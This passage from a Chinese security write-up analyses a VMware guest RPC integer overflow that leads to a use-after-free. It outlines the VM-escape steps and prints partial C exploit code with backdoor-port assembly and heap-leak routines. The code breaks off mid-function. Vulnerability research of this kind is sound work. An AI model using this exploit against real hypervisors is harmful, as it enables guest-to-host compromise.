id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>首先判断<code>byte_FE9584</code>，也是一个魔数，接着就判断长度。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" alt="图片.png"></p><p>长度为-1或者大于0x10000就会报错。如果RPCI的长度符合就会继续往下走。!</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" alt="图片.png"><br> 在这个判断中，比较56和21偏移处的值，v56为接收到的数据包，v21为现有长度，如果数据长度大于现有长度则realloc重新分配，设置空间大小为新的大小，且修改msg_struct。</p><p>漏洞就出在这个部分。漏洞存在的比较隐秘，大体属于整形溢出。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" alt="图片.png"></p><p>此处，处理size的时候加入了LOWORD修饰，导致dword-&gt;word高位失去，所以如果设置v56&#x3D;0xffff则可以通过大小判断，然后LOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0，则此时的realloc第二个参数为0，运行时重新回收ptr。也没有清0.导致了ptr的UAF利用。</p><h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>首先读入了需要发送的data指令，然后读取RPCI结构体，根据前面设置的长度，以不同的方式发送msg，一次最多发送四个字节，四个字节以内发送的方式都是一个byte一个byte的复制。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" alt="图片.png"></p><p>发送完指令之后，判断是否发送完，如果发送完了则进入指令处理，根据一个类似虚表的bss段指针，执行某个函数rw2018中，最后就是劫持了这样一个函数，让我们成功逃逸。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" alt="图片.png"><br> 处理完之后，flag标志为设置为1.具体的指令可以搜索字符串，之前分析的rw2018中也有相应的分析，这里就不赘述。</p><h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" alt="图片.png"></p><p>guest获得，返回的长度，逻辑简单。</p><h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>执行指令之后返回的数据。</p><p>逻辑和发送差不多，同样的先收到长度，然后判断长度，一次接受四个字节，然后再把数据转移到缓冲区。最后设置flag为发送完毕。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" alt="图片.png"></p><h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>这两个部分也较为简单，前者在rw2018详细分析过，后者就是close channel。同时设置flag为1，整个指令处理发送接收流程结束。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面说过了，漏洞存在于realloc中，利用该UAF可以造成泄露等操作。实际上leak和利用的思路还是和rw差不多的。</p><p>此处的UAF位置在realloc环节也就是设置发送长度的环节，但是造成UAF leak虚表还是需要先设置一个0x100大小的缓冲区。</p><ul><li>开启channel A channel B</li><li>A设置buffer为0x100， B 使用info get也设置为0x100</li><li>然后set_len触发A漏洞，B get这个buffer，A再次触发漏洞。此时B 的buffer已经在tcache里了</li><li>调用dnd_vison函数写入虚表</li><li>leak</li></ul><p>漏洞利用也是和rw一样，直接tcache劫持即可</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>主要的流程还是复制rw2018的，改动少部分即可。还是对师傅的脚本分析</p><p>leak函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" alt="图片.png"></p><p>完整的channel 0 发送指令</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" alt="图片.png"></p><p>channel发送部分info get</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" alt="图片.png"></p><p>free channel 0 的buffer，然后在channel 1realloc出来。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" alt="图片.png"></p><p>再次free</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" alt="图片.png"></p><p>dnd_verison打入虚表</p><p>tcache劫持操作也是一样的，只是改掉了触发的位置。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token 